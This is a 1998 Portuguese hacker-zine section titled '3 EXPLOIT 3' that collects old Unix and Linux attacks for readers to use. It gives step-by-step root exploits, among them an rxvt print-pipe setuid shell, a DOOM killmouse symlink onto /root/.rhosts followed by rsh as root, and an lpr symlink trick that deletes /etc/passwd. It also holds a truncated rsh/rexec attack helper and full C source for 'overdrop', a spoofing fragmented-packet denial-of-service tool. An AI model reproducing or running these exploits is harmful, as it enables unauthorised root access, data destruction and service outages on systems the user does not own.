@@ -1,0 +1,455 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+
+                                3 EXPLOIT 3
+
+                                    BY
+
+                                   Draco
+
+           Ta ai mais uma porrada de EXPLOIT, tem alguns energuminos me
+           perguntando o porque eu coloco tanto exploit se eles nao
+           prestam para nada????
+
+           Bom se nao prestassem nao estariam aqui........ tem coisa que eu
+           editei que você nao acha em lugar nenhum do mundo gente se liga
+           e vamos ver se vocês aprendem um pouco e colocam coisa que presta
+           na cuca de vocês....... Nesta ediçao vai ter só algums exploits
+           vai depender tudo da quantia que eu pegar por ai nestes tempos ou
+           do que eu deva ou nao  colocar no zine afinal eu coloquei muita
+           coisa aqui que vc[]'z nao deram o minimo valor ....
+
+           Antes de virem falando merda pra mim tipo, "CARA NAO EXISTE
+           EXPLOIT PARA WINDOWS 95, MANDA AI, O LINUX É MUITO RUIM EU TINHA
+           MAS NAO CONSSEGUIA HACKEAR OS MACROS DE WORD COM ELE ME AJUDA?"
+
+           Olha bem antes de vim falar estas merdas pra mim ok[]'Z...
+
+           EXPLOIT LINK ------->> http://www.rootshell.com
+           
+           Esta NOTA é para quem programa: seria muito interessante se um
+           programa qualquer fizesse o box do shell e mandasse o sistema
+           remoto compilar o EXPLOIT deste modo o prog roda o EXPLOIT para
+           você e as lamahs nao reclamariam que nao consseguem usar.....
+
+           Se você consseguir fazer qualquer coisa parecida e-mail em mim....
+
+           rxvt para Linux Slackware 3.0, RedHat 2.1, ele te da o ROOT
+           Autor: Dave M. (put[]'Z ete cara de novo)
+
+           Exploitando:
+
+           1.  Logue em um sistema qualquer que você tenha um account.
+
+           2.  Digite no Shell:
+           $ echo 'cp /bin/sh /tmp/rxsh;chmod 4755 /tmp/rxsh' > /tmp/rxbug
+           $ chmod +x /tmp/rxbug
+           $ rxvt -print-pipe /tmp/rxbug
+           3.  No rxvt xclient:
+           $ cat
+           ESC[5i
+           ESC[4i
+    
+           4.  $ /tmp/rxsh
+           # whoami
+           root
+           #
+
+------------------------------------------------------------------------------
+           
+           O problema do KILL MOUSE/STARTMOUSE, este comando esta na parte
+           dos pacotes DOOM em sistemas LINUX, é só rodar estes dois scripts.
+
+----------------------------------startmouse.sh
+
+/usr/games/doom/startmouse.sh:
+#!/bin/sh
+if [ -r /tmp/gpmkilled ]; then
+  /usr/bin/grep gpm /etc/rc.d/rc.local > /tmp/gpmscript
+  /bin/sh /tmp/gpmscript; /bin/rm /tmp/gpmscript /tmp/gpmkilled
+fi
+
+----------------------------------startmouse.sh
+
+----------------------------------killmouse.sh
+
+/usr/games/doom/killmouse.sh:
+#!/bin/sh
+if /bin/ps ax | /usr/bin/grep -v grep | /usr/bin/grep "gpm" ; then
+  GPM_RUNNING=true; /bin/killall gpm; /bin/touch /tmp/gpmkilled
+fi
+
+----------------------------------killmouse.sh
+
+$ touch /tmp/gpmkilled
+$ /usr/games/doom/startmouse
+
+ps -aux | grep gpm
+bo        1436  0.0  2.0   40  312 v03 R    16:33   0:00 grep gpm
+root      1407  0.0  2.4   42  368  ?  S    16:24   0:00 /usr/bin/gpm t ms
+
+
+$ umask 0
+$ ln -s /root/.rhosts /tmp/gpmkilled
+$ /usr/games/doom/killmouse
+ 1407  ?  S     0:00 gpm t ms
+
+$ ls -l /root/.rhosts
+-rw-rw-rw-   1 root     users           0 Dec 13 16:44 /root/.rhosts
+
+$ echo localhost bo > /root/.rhosts
+$ rsh -l root localhost sh -i
+bash#
+
+------------------------------------------------------------------------------
+
+           Jaeger, abre a porta do cliente, sistema FBSD, ultrix e linux
+           by jaeger (jaeger@dhp.com)
+                  
+           begin prservice.c
+
+------------------Corte aqui
+
+/* modified by jaeger 12Nov1996. Duplicated slack coding style.
+
+
+
+   now takes
+
+        port locuser remuser [cmd]
+
+        port remuser passwd [cmd]
+
+   where port is the dst port you wish the stderr socket to connect to
+
+   from the server to the client machine.
+
+
+
+/* generate ^@string1^@string2^@cmd^@ input to netcat, for scripting up
+
+   rsh/rexec attacks.  Needs to be a prog because shells strip out nulls.
+
+
+
+   args:
+
+        locuser remuser [cmd]
+
+        remuser passwd [cmd]
+
+
+
+   cmd defaults to "pwd".
+
+
+
+   ... whatever.  _H*/
+
+
+
+#include <stdio.h>
+
+
+
+/* change if you like; "id" is a good one for figuring out if you won too */
+
+static char cmd[] = "pwd";
+
+
+
+static char buf [256];
+
+
+
+main(argc, argv)
+
+  int argc;
+
+  char * argv[];
+
+{
+
+  register int x;
+
+  register int y = 0;
+
+  char * p;
+
+  char * q;
+
+
+
+  p = buf;
+
+  memset (buf, 0, 256);
+
+
+
+  if (! argv[1])
+
+    goto wrong;
+
+  x = strlen (argv[1]);
+
+  memcpy (p, argv[1], x);       /* port plus null */
+
+  x++;
+
+  p += x;
+
+  y += x;
+
+
+
+  if (! argv[2])
+
+    goto wrong;
+
+  x = strlen (argv[2]);
+
+  memcpy (p, argv[2], x);       /* second arg plus null */
+
+  x++;
+
+  p += x;
+
+  y += x;
+
+
+
+  if (! argv[3])
+
+---------------------Corte aqui
+
+------------------------------------------------------------------------------
+
+           Usuario pode pegar o passwd, sistema linux
+           by Zygo Blacell (zblaxell@MIRANDA.UWATERLOO.CA) 
+           
+           Em um diretorio onde voce possa escrever, entre nele e edita um
+           arquivo unlinkavel. O problema esta em lpr(1)nao olhe os
+           diretorios com (eg. /tmp)
+
+           [ patch deleted]
+
+           D'oh!  It doesn't.  :(
+
+           Patheie o script e zaz daqui algums dias volte lá e de um lpr-s
+           
+           mkdir /tmp/foobar
+           ln -s /etc/passwd /tmp/foobar
+           lpr big_huge_file
+           lpr -r /tmp/foobar/passwd
+
+           rm -rf /tmp/foobar ; ln -s /etc /tmp/foobar
+
+           OU
+
+           ln -fs /home/private_file /tmp/foobar/passwd # Does this work?
+
+           /etc/passwd goes away.
+
+------------------------------------------------------------------------------
+
+           Usuario loga como ROOT, sistema linux
+           by Ken Weaverling (weave@hopi.dtcc.edu)
+
+           Em alguns sistemas antigos de Linux existem um bug muito escroto,
+           onde é so colocao alguns sinais que vc loga como ROOT...
+
+           No sistema Slackware 2.3/ kernel 1.2.13. é só digitar quando vc
+           for logar pelo telnet...
+
+           '+::0:0:::'
+
+           Sacou é isto mesmo é só digitar no password '+::0:0:::'
+
+------------------------------------------------------------------------------
+
+           Rlogin, usuario loga como ROOT, sistema AIX e
+           Linux (Slackware 3.1, Redhat 2.0-2.1) autor desconhecido bug
+           retirado da ROOTSHELL
+
+           :
+           % rlogin haxored.net -l -froot
+           #
+
+------------------------------------------------------------------------------
+
+           ip_fragment.c, nao sei o que faz ainda nao testei, sistema
+           Linux 2.0.33 remandado por Michal Zalewski
+           <lcamtuf@boss.staszic.waw.pl>
+
+----------------------ip_fragment.c
+
+        if(len>65535)
+                {
+-               printk("Oversized IP packet from %s.\n", in_ntoa(qp->iph->saddr));
++               NETDEBUG(printk("Oversized IP packet from %s.\n", in_ntoa(qp->iph->saddr)));
+                ip_statistics.IpReasmFails++;
+                ip_free(qp);
+                return NULL;
+
+-------------------------------------------------------------------------
+
+// overdrop by lcamtuf [Linux 2.0.33 printk abuse]
+// ------------------------------------------------
+// based on (reaped from) teardrop by route|daemon9
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+
+#define IP_MF	0x2000
+#define IPH	0x14
+#define UDPH	0x8
+#define PADDING	0x1c
+#define MAGIC	0x3
+#define COUNT	0xBEEF
+#define FRAG2	0xFFFF
+
+void usage(char *name) {
+  fprintf(stderr,"%s dst_ip [ -n how_many ] [ -s src_ip ] [ -x ] (use -x for express delivery).\n",name);
+  exit(0);
+}
+
+u_long name_resolve(char *host_name) {
+  struct in_addr addr;
+  struct hostent *host_ent;
+  if ((addr.s_addr=inet_addr(host_name))==-1) {
+    if (!(host_ent=gethostbyname(host_name))) return (0);
+    bcopy(host_ent->h_addr,(char *)&addr.s_addr,host_ent->h_length);
+  }
+  return (addr.s_addr);
+}
+
+
+void send_frags(int sock,u_long src_ip,u_long dst_ip,u_short src_prt,u_short dst_prt) {
+  u_char *packet=NULL,*p_ptr=NULL;
+  u_char byte;
+  struct sockaddr_in sin;
+  sin.sin_family=AF_INET;
+  sin.sin_port=src_prt;
+  sin.sin_addr.s_addr=dst_ip;
+  packet=(u_char *)malloc(IPH+UDPH+PADDING);
+  p_ptr=packet;
+  bzero((u_char *)p_ptr,IPH+UDPH+PADDING);
+  byte=0x45;
+  memcpy(p_ptr,&byte,sizeof(u_char));
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(IPH+UDPH+PADDING);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(242);
+  p_ptr+=2;
+  *((u_short *)p_ptr)|=htons(IP_MF);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=0x40;
+  byte=IPPROTO_UDP;
+  memcpy(p_ptr+1,&byte,sizeof(u_char));
+  p_ptr+=4;
+  *((u_long *)p_ptr)=src_ip;
+  p_ptr+=4;
+  *((u_long *)p_ptr)=dst_ip;
+  p_ptr+=4;
+  *((u_short *)p_ptr)=htons(src_prt);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(dst_prt);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(8+PADDING);
+  if (sendto(sock,packet,IPH+UDPH+PADDING,0,(struct sockaddr *)&sin,
+      sizeof(struct sockaddr))==-1) {
+    perror("\nsendto");
+    free(packet);
+    exit(1);
+  }
+  p_ptr=&packet[2];
+  *((u_short *)p_ptr)=htons(IPH+MAGIC+1);
+  p_ptr+=4;
+  *((u_short *)p_ptr)=htons(FRAG2);
+  if (sendto(sock,packet,IPH+MAGIC+1,0,(struct sockaddr *)&sin,
+      sizeof(struct sockaddr))==-1) {
+    perror("\nsendto");
+    free(packet);
+    exit(1);
+  }
+  free(packet);
+}
+
+
+int main(int argc, char **argv) {
+  int one=1,count=0,i,rip_sock,lag=500;
+  u_long  src_ip=0,dst_ip=0;
+  u_short src_prt=0,dst_prt=0;
+  struct in_addr addr;
+  fprintf(stderr,"overdrop by lcamtuf [based on teardrop by route|daemon9]\n\n");
+  if((rip_sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
+    perror("raw socket");
+    exit(1);
+  }
+  if (setsockopt(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {
+    perror("IP_HDRINCL");
+    exit(1);
+  }
+  if (argc < 2) usage(argv[0]);
+  if (!(dst_ip=name_resolve(argv[1]))) {
+    fprintf(stderr,"Can't resolve destination address.\n");
+    exit(1);
+  }
+  while ((i=getopt(argc,argv,"s:n:x"))!=EOF) {
+    switch (i) {
+      case 'n':
+        count   = atoi(optarg);
+        break;
+      case 's':
+        if (!(src_ip=name_resolve(optarg))) {
+          fprintf(stderr,"Can't resolve source address.\n");
+          exit(1);
+        }
+	break;
+      case 'x':
+        lag=0;
+        break;
+      default:
+        usage(argv[0]);
+        break;
+    }
+  }
+  srandom((unsigned)(time((time_t)0)));
+  if (!count) count=COUNT;
+  fprintf(stderr,"Sending oversized packets:\nFrom: ");
+  if (!src_ip) fprintf(stderr,"       (random)"); else {
+    addr.s_addr = src_ip;
+    fprintf(stderr,"%15s",inet_ntoa(addr));
+  }
+  addr.s_addr = dst_ip;
+  fprintf(stderr,"\n  To: %15s\n",inet_ntoa(addr));
+  fprintf(stderr," Amt: %5d\n",count);
+  fprintf(stderr,"[ ");
+  for (i=0;i<count;i++) {
+    if (!src_ip) send_frags(rip_sock,rand(),dst_ip,rand(),rand()); else
+      send_frags(rip_sock,src_ip,dst_ip,rand(),rand());
+    fprintf(stderr, "b00z ");
+    usleep(lag);
+  }
+  fprintf(stderr, "]\n");
+  return (0);
+}
+
+----------------------ip_fragment.c
+
+------------------------------------------------------------------------------
+
+           1998 FW - Corporation
+           
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+
+
+
